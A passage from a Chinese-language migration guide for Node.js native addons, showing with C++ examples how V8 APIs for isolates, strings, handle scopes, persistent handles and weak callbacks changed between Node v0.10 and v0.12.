      <span class="c1">// but this works</span>
      <span class="n">info</span><span class="p">.</span><span class="n">GetReturnValue</span><span class="p">().</span><span class="n">Set</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">int32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
      <span class="c1">// as does this</span>
      <span class="n">info</span><span class="p">.</span><span class="n">GetReturnValue</span><span class="p">().</span><span class="n">Set</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>当然你需要挑选合适的类型来转换。当转化为窄数据类型，以至于无法承载原始数据据时，将会产生不可预期的结果。<br>注意，<code>v8::FunctionCallbackInfo&lt;v8::Value&gt;</code>是对于<code>v8::Arguments</code>的重命名和参数化（parameterized ）。除了名字和额外的<code>GetReturnValue()</code>函数，他们没有表面上的差别。</p>
<h2><a name="v8-apiv8isolate" class="anchor" href="#v8-apiv8isolate"><span class="header-link"></span></a>大部分V8 API现在需要使用v8::Isolate*</h2>
<p>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Number</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Number</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="mf">13.37</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">FunctionTemplate</span><span class="o">&gt;</span> <span class="n">ft</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionTemplate</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">Foo</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="mi">42</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Number</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Number</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="mf">13.37</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">FunctionTemplate</span><span class="o">&gt;</span> <span class="n">ft</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionTemplate</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">Foo</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>你可以通过若干的方法获取当前的<code>v8::Isolate</code>的指针：  </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="kt">void</span> <span class="nf">FortyTwo</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;&amp;</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">;</span>
      <span class="n">isolate</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetIsolate</span><span class="p">();</span>
      <span class="c1">// or:</span>
      <span class="n">isolate</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetReturnValue</span><span class="p">().</span><span class="n">GetIsolate</span><span class="p">();</span>
      <span class="c1">// or even:</span>
      <span class="n">isolate</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">::</span><span class="n">GetCurrent</span><span class="p">();</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>注意，V8团队已经指出，<code>v8::Isolate::GetCurrent()</code>将会被逐步淘汰。如果你想编写向后兼容的代码，你最好显式的传递isolate参数。</p>
<h2><a name="v8-string" class="anchor" href="#v8-string"><span class="header-link"></span></a>V8 string函数现在需要显式声明编码</h2>
<p>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="c1">// create a UTF-8 string</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">utf8</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="s">&quot;42&quot;</span><span class="p">);</span>
    <span class="c1">// create a UTF-16 string from input in system endianness</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">uint16_t</span> <span class="n">chars</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">&#39;4&#39;</span><span class="p">,</span> <span class="sc">&#39;2&#39;</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">utf16</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">chars</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="c1">// create a UTF-8 string</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">utf8</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromUtf8</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="s">&quot;42&quot;</span><span class="p">);</span>
    <span class="c1">// create a UTF-16 string from input in system endianness</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">uint16_t</span> <span class="n">chars</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">&#39;4&#39;</span><span class="p">,</span> <span class="sc">&#39;2&#39;</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">utf16</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromTwoByte</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">chars</span><span class="p">);</span>
    <span class="c1">// create a ISO-8859-1 a.k.a. Latin1 string</span>
    <span class="k">const</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">octets</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="kt">uint8_t</span><span class="o">*&gt;</span><span class="p">(</span><span class="s">&quot;42&quot;</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">latin1</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromOneByte</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">octets</span><span class="p">);</span>
</pre></div>
</code></pre>
<p><code>v8::String::NewFromTwoByte()</code>稍微有点命名的不合适，因为他并不是一个严格的双字节编码。他能够识别surrogate pairs【 链接：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd374069(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/dd374069(v=vs.85).aspx</a> 】， 所以它应该被称作<a href="https://zh.wikipedia.org/wiki/UTF-16">UTF-16</a>，而不是<a href="https://zh.wikipedia.org/wiki/Universal_Character_Set">UCS-2</a>。</p>
<h2><a name="v8stringnewsymbolv8stringnewundetectable" class="anchor" href="#v8stringnewsymbolv8stringnewundetectable"><span class="header-link"></span></a>去除了v8::String::NewSymbol()和v8::String::NewUndetectable()</h2>
<p>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">symbol</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewSymbol</span><span class="p">(</span><span class="s">&quot;42&quot;</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">hidden</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewUndetectable</span><span class="p">(</span><span class="s">&quot;42&quot;</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">symbol</span> <span class="o">=</span>
        <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromUtf8</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="s">&quot;42&quot;</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">kInternalizedString</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">hidden</span> <span class="o">=</span>
        <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromUtf8</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="s">&quot;42&quot;</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">kUndetectableString</span><span class="p">);</span>
</pre></div>
</code></pre>
<h2><a name="v8stringasciivalue" class="anchor" href="#v8stringasciivalue"><span class="header-link"></span></a>去除了v8::String::AsciiValue</h2>
<p>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">string</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">AsciiValue</span> <span class="n">s</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：
Nothing! <code>v8::String::AsciiValue</code>本来就有问题：它的名字告诉大家要返回7比特的ASCII数据，但是实际上返回8比特的二进制数据。同时它搞混了多字节字符的字节序。<br>使用<code>v8::String::Utf8Value</code>或者<code>v8::String::Value</code>(适用于UTF-16)来进行替代。如果你想获取一个字符串的原始二进制数据，你可以这么做：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">string</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">string</span><span class="o">-&gt;</span><span class="n">Utf8Length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">// Add one for trailing zero byte.</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint8_t</span><span class="p">[</span><span class="n">length</span><span class="p">];</span>
    <span class="n">string</span><span class="o">-&gt;</span><span class="n">WriteOneByte</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="cm">/* start */</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>注意：<code>v8::String::Utf8Length()</code>会迭代字符串中的每一个字符，这就是为啥对于大字符串来说会(很)慢的原因。</p>
<h2><a name="v8handlescopeclose" class="anchor" href="#v8handlescopeclose"><span class="header-link"></span></a>去除了v8::HandleScope::Close()</h2>
<p>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">Example</span><span class="p">()</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">HandleScope</span> <span class="n">handle_scope</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">handle_scope</span><span class="p">.</span><span class="n">Close</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="mi">42</span><span class="p">));</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">Example</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">EscapableHandleScope</span> <span class="n">handle_scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">handle_scope</span><span class="p">.</span><span class="n">Escape</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="mi">42</span><span class="p">));</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<h2><a name="v8persistenttv8handlet" class="anchor" href="#v8persistenttv8handlet"><span class="header-link"></span></a>v8::Persistent<T>不再继承自v8::Handle<T></h2>
<p><code>v8::Persistent&lt;T&gt;</code>不再是<code>v8::Handle&lt;T&gt;</code>类型的对象。这就意味着，你不能在直接访问指向的句柄了。做出如此大变革的动机是由于在v0.10中这么操作太容易导致资源泄露或者导致在释放之后再访问其存储的内容。<br>在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">persistent</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;::</span><span class="n">New</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value_again</span> <span class="o">=</span> <span class="o">*</span><span class="n">persistent</span><span class="p">;</span>
    <span class="c1">// ...</span>
    <span class="n">persistent</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
    <span class="n">persistent</span><span class="p">.</span><span class="n">Clear</span><span class="p">();</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">persistent</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="c1">// or:</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">persistent</span><span class="p">;</span>
    <span class="n">persistent</span><span class="p">.</span><span class="n">Reset</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value_again</span> <span class="o">=</span>
        <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;::</span><span class="n">New</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">persistent</span><span class="p">);</span>  <span class="c1">// rematerialize handle</span>
    <span class="c1">// ...</span>
    <span class="n">persistent</span><span class="p">.</span><span class="n">Reset</span><span class="p">();</span>
</pre></div>
</code></pre>
<p>另外一个变化是，persistent 句柄现在不能被拷贝。在Node v0.10中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;::</span><span class="n">New</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>  <span class="c1">// a and b now point to |value|</span>
</pre></div>
</code></pre>
<p>在Node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">a</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">b</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
    <span class="c1">// or:</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">b</span><span class="p">;</span>
    <span class="n">b</span><span class="p">.</span><span class="n">Reset</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>由于<code>v8::Persistent&lt;T&gt;</code>没有在语法上提供拷贝功能，所以现在使用STL容器类的时候会更困难。鉴于此，V8在<code>v8-util.h</code>中提供了若干工具类。</p>
<p>举个例子：  </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="err">#</span><span class="n">include</span> <span class="s">&quot;v8-util.h&quot;</span>

    <span class="kt">void</span> <span class="n">Example</span><span class="p">(</span><span class="n">v8</span><span class="o">:</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">StdPersistentValueMap</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">NewFromUtf8</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="s">&quot;fortytwo&quot;</span><span class="p">);</span>
      <span class="n">map</span><span class="p">.</span><span class="n">Set</span><span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
      <span class="n">assert</span><span class="p">(</span><span class="n">map</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span><span class="mi">42</span><span class="p">));</span>
      <span class="n">assert</span><span class="p">(</span><span class="n">map</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">StrictEquals</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
      <span class="n">assert</span><span class="p">(</span><span class="n">map</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">21</span><span class="p">).</span><span class="n">IsEmpty</span><span class="p">());</span>
      <span class="n">assert</span><span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="n">map</span><span class="p">.</span><span class="n">Size</span><span class="p">());</span>
      <span class="n">map</span><span class="p">.</span><span class="n">Remove</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span>
      <span class="n">assert</span><span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">map</span><span class="p">.</span><span class="n">Size</span><span class="p">());</span>
      <span class="n">map</span><span class="p">.</span><span class="n">Clear</span><span class="p">();</span>  <span class="c1">// or we could just call .Clear()</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>如果你使用<code>[C++](https://zh.wikipedia.org/wiki/CBB11 &quot;%3&quot;)</code>,你可以在标准容器类的<a href="http://www.cprogramming.com/c++11/rvalue-references-and-move-semantics-in-c++11.html">移动语义</a>中使用<code>v8::UniquePersistent&lt;T&gt;</code>。<br>或者，你可以通过具有拷贝特性的<code>v8::Persistent&lt;T&gt;</code>,但是要保证这么做不会导致资源泄露或者在释放后再使用的问题：  </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="cm">/* ... */</span><span class="p">;</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">CopyablePersistentTraits</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;::</span><span class="n">CopyablePersistent</span> <span class="n">persistent</span><span class="p">;</span>
    <span class="n">persistent</span><span class="p">.</span><span class="n">Reset</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="cm">/* ... */</span><span class="p">);</span>
</pre></div>
</code></pre>
<h2><a name="persistent" class="anchor" href="#persistent"><span class="header-link"></span></a>弱引用persistent句柄的回调函数参数更改</h2>
<p>一个正常的persistent句柄会被垃圾回收器忽略掉，一直到程序手动释放才会被回收。<br>相反，弱引用persistent句柄会被垃圾回收器跟踪，当需要回收时，回收器会通过回调函数通知程序。接着程序释放掉关联的资源或者复用这个句柄如果对象还要在后续使用的话。<br>在Node v0.10中这么写：  </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="kt">void</span> <span class="nf">WeakCallback</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">object</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">arg</span><span class="p">));</span>
      <span class="n">object</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>  <span class="c1">// or .ClearWeak() if you want to keep it around</span>
    <span class="p">}</span>

    <span class="kt">void</span> <span class="nf">Example</span><span class="p">()</span> <span class="p">{</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">HandleScope</span> <span class="n">handle_scope</span><span class="p">;</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">object</span> <span class="o">=</span> <span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">::</span><span class="n">New</span><span class="p">();</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">persistent</span> <span class="o">=</span>
          <span class="n">v8</span><span class="o">::</span><span class="n">Persistent</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;::</span><span class="n">New</span><span class="p">(</span><span class="n">object</span><span class="p">);</span>
      <span class="n">persistent</span><span class="p">.</span><span class="n">MakeWeak</span><span class="p">(</span><span class="k">const_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="s">&quot;fortytwo&quot;</span><span class="p">),</span> <span class="n">WeakCallback</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>在Node v0.12中这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="kt">void</span> <span class="nf">WeakCallback</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">WeakCallbackData</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*&gt;&amp;</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">GetParameter</span><span class="p">());</span>
      <span class="c1">//persistent的存储单元将会自动清除。</span>
      <span class="c1">//如果你想保持对原始v8::Persistent&lt;T&gt;的引用，你可以使用.ClearWeak()来复用它。</span>
    <span class="p">}</span>

